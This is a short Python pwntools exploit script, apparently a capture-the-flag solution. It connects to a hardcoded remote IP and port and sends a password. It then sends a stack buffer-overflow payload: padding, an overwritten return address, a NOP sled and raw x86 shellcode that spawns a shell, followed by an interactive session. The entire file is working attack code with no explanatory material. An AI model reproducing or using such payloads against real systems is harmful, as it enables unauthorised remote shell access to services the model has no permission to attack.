from pwn import *

r = remote("143.198.55.88", 2000)

password = b"Buffargy!"

payload = b"A" * 516
payload += p32(0x08048631)
payload += b"\x90" * 14
payload += b"\x31\xc0\x50\x68\x64\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"


r.sendlineafter("Enter The password:\n", password)
r.sendlineafter("OverFLow the buffer:\n", payload)
r.interactive()
